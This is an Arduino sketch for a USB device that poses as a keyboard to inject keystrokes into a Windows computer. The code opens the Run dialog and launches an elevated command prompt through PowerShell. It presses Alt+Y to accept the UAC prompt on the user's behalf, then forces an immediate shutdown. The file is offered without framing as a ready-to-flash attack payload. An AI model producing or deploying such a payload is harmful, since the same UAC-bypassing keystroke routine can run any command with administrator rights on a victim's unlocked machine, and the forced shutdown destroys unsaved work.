#include <HID-Project.h>
#include <HID-Settings.h>

// Configuration constants
const int CMD_DELAY = 500;
const int LONG_DELAY = 1500;
const int SHORT_DELAY = 50;

// Utility function to simulate key press and release
void typeKey(int key) {
  Keyboard.press(key);
  delay(SHORT_DELAY);
  Keyboard.release(key);
}

// Utility function to execute a command with Enter key
void executeCommand(const char* command) {
  Keyboard.print(command);
  typeKey(KEY_RETURN);
  delay(CMD_DELAY);
}

// Utility function to open an elevated command prompt
void openElevatedCmd() {
  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(CMD_DELAY);

  // Start cmd with elevated privileges
  executeCommand("powershell Start-Process cmd -Verb RunAs");

  // Accept UAC prompt
  delay(LONG_DELAY);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(CMD_DELAY);
}

void setup() {
  // Initialize HID devices
  Keyboard.begin();

  // Open elevated command prompt
  openElevatedCmd();

  // Execute shutdown command (immediate shutdown)
  executeCommand("shutdown /s /t 0");

  // Terminate HID devices
  Keyboard.end();
}

void loop() {
  // Empty loop as payload runs once
}